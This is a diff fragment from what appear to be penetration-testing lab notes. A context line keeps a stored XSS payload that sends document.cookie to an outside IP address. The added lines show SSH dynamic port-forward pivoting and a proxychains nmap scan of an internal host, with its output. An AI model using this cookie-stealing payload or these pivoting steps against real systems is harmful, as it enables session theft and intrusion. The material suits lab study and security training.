@@ -150,11 +150,25 @@ ________________________________________________________________________________
     <script>document.location="http://10.50.21.223:8000/"+document.cookie;</script>
 ## (Stored Cross Site Scripting XSS)
 ________________________________________________________________________________________________________________
-
-
+## Next we are going to scan the IP found so close previous dynamic port forward: 
+    ssh -S /tmp/jump jump -O cancel -D9050
+## Followed by creating new port forward to scan the other side: 
+    ssh -S /tmp/t1 t1 -O forward -D9050
 ________________________________________________________________________________________________________________
+## In new panel start scanning: 
+    proxychains nmap -T4 -Pn 10.100.28.55 -p80
+```
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-21 20:24 UTC
+|S-chain|-<>-127.0.0.1:9050-<><>-10.100.28.55:80-<><>-OK
+Nmap scan report for 10.100.28.55
+Host is up (0.0081s latency).
 
+PORT   STATE SERVICE
+80/tcp open  http
 
+Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
+
+```
 ________________________________________________________________________________________________________________
 
 
